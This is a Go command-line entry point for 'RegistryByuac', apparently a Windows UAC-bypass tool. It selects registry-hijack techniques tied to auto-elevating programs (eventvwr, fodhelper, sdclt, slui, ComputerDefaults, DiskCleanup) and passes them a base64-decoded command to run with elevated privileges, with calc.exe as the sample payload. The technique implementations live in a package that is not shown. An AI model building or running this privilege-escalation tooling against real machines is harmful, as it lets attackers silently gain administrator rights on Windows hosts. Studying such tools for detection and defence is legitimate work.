package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/yunying/RegistryByuac/models"
)

var (
	h      bool
	mode   string
	path   string
	winver bool
)

func parsewinver(winver bool) {
	if winver {
		fmt.Println(models.Version())
	}
}

func parsecommand(m string, p string) {
	if mode != "" && path != "" && !winver {
		p = string(models.Base64Decode(p))
		if m == "Ev" {
			models.Eventvwr_registry(p)
		} else if m == "Co" {
			models.Computer_registry(p)
		} else if m == "Fo" {
			models.Fodhelper_registry(p)
		} else if m == "Sd" {
			models.Sdclt_registry(p)
		} else if m == "Sl" {
			models.Slui_registry(p)
		} else if m == "Di" {
			models.Disk_registry(p)
		} else {
			fmt.Println("No such mode")
		}
	}

}
func usage() {
	fmt.Fprintf(os.Stderr, `Support Eventvwr/ComputerDefaults/Fodhelper/Sdclt/Slui/DiskCleanup
Quick start: ./RegistryByuac -m Ev/Co/Fo/Sd/Sl/Di -e Y2FsYy5leGU=
`)
	flag.PrintDefaults()
}

func main() {
	flag.BoolVar(&h, "h", false, "Help")
	flag.StringVar(&mode, "m", "", "Select Ev/Co/Fo/Sd/Sl")
	flag.StringVar(&path, "e", "", "File Path Or Command")
	flag.BoolVar(&winver, "v", false, "Search For Winver")
	flag.Parse()
	if h {
		usage()
		return
	}
	if mode == "" && path == "" && !winver {
		fmt.Println("Missing Parameters")
		usage()
		return
	}
	parsewinver(winver)
	parsecommand(mode, path)
}
